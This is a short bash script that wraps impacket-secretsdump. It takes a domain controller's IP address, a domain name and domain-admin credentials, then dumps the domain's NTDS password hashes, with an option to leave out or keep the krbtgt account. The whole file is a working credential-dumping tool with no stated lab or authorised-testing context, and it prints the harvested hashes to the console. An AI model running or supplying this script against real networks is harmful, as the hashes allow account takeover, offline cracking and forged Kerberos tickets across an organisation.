#!/bin/bash

KRBTGT=true
TARGET=""
PSSWD=""
UNAME=""
DOMAIN_NAME=""

while [[ $# -gt 0 ]]; do
    case "$1" in
	 --target)
        
	    if [[ $# -lt 2 || -z "$2" ]]; then
                echo "Error: --target requires an IP address"
                exit 1
            fi
            TARGET="$2"
            shift 2
            ;;
        
	--krbtgt)
            if [[ $# -lt 2 ]]; then
                echo "Error: --krbtgt requires true or false"
                exit 1
            fi
            case "$2" in
                true|false)
                    KRBTGT="$2"
		    ;;
                *)
                    echo "Error: value must be true or false"
                    exit 1
                    ;;
		esac
		shift 2
		;;
	--psswd)
	    if [[ $# -lt 2 || -z "$2" ]]; then
		echo "Error: you must provide valid active directory domain credentials"
		exit 1
	    fi
	    PSSWD="$2"    
            shift 2
            ;;
	--domain)
	    if [[ $# -lt 2 || -z "$2" ]]; then
		echo "please provide the domain name"
		exit 1
	    fi
	    DOMAIN_NAME="$2"
	    shift 2
	    ;;
	--username)
            if [[ $# -lt 2 || -z "$2" ]]; then
                echo "please provide the domain admin username"
                exit 1
            fi
            UNAME="$2"
            shift 2
            ;;

        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

echo "KRBTGT setting: $KRBTGT"

hashes=""

if [ "$KRBTGT" = "true" ]; then
	hashes=$(impacket-secretsdump "$DOMAIN_NAME"/"$UNAME":"$PSSWD"@"$TARGET" -just-dc)
	echo "$hashes"
	echo "if you see this then it works"
else
	echo "[+] Filtering out krbtgt"
	hashes=$(impacket-secretsdump "$DOMAIN_NAME"/"$UNAME":"$PSSWD"@"$TARGET" -just-dc | grep -v -i "krbtgt")
	echo "$hashes"
	echo "if you see this then it works"

fi

echo "$hashes"

